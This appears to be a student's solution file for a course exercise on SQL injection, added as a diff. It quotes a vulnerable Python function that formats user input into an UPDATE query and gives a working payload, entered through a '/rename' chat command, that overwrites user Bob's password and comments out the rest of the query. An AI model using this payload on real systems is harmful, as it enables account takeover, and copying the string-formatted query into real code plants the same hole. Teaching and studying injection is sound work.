@@ -1,0 +1,21 @@
+Q4 - sql injection
+
+As we saw in the lecture, we can take advantage of this function in model.py:     
+def rename_user(self, user_id, new_name):
+    self.db_connection.executescript(
+     "UPDATE users SET full_name = '%s' WHERE user_id = '%s'" %
+            (new_name, user_id,)
+        )
+        
+        because rename action takes (user_id, name), we can pass the name so it will fit this SQL command, but we add an ',
+        to close the name and then to add another SET request (sql injection). the command will change bob password to sha1(1234) based on his username.
+         then we comment the rest for making the rest of the code not to be executed.
+        
+        
+FINAL QUERY:        
+UPDATE users SET full_name = 'Bob Marmite', password = sha1('1234') WHERE username = 'bob' -- WHERE user_id = 'bob'; 
+
+SOLUTION:
+#general-spam
+/rename bob Bob Marmite' , password = sha1('1234') WHERE username = 'bob' --
+
